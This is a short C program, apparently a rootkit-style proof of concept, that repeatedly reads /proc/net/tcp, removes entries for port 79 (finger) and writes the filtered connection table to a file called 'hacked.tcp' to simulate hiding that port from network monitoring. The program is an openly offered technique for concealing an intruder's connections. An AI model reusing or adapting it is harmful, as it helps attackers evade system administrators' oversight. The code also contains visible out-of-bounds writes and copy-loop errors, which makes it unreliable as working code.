/*
    this shit emulates nethiding. In phile 'hacked.tcp' it generates
  output 4 analyz. It hidez port 79/tcp.

*/

#include <stdio.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/types.h>
#include <sys/stat.h>


int main()
{
int fd,newpage,i;
unsigned short int cnt;
char hport[3];
char record[150];
char newstr[150];

while(1){

cnt = 0;
memset(&hport,0,3);

if (( newpage = open("hacked.tcp",O_WRONLY | O_CREAT | O_TRUNC,444)) <0){
    printf("fuck in opening new sockets page\n");
    exit(0);
}

if ((fd = open("/proc/net/tcp",O_RDONLY)) <0){
    printf("fuck in opening /proc/net/tcp\n");
    exit(0);
}	

read(fd,record,150); /* skip header */
write(newpage,record,150);

      while( read(fd,record,150) >0){

	i = 16;
	if (cnt <10) i = 15;

	hport[0]=record[i];
      hport[1]=record[i+1];
	hport[2]=record[i+2];
	hport[3]=record[i+3];

	    if (strncmp(hport,"004F",4) != 0){

		sprintf(newstr,"\x20\x20\x20\x25\x69\x0a",cnt);

		if (cnt < 10){
			for (i=4; i<=150; i++)
		    		newstr[i]=record[i];
		} else {
			for (i=4; i<=147; i++)			
				newstr[i+1]=record[i];
		    strcat(newstr," \n");
		}
		
		write(newpage,newstr,150);
		cnt++;    
	    }    
      }

close(newpage);
close(fd);
sleep(2);   
}
exit(0);
}

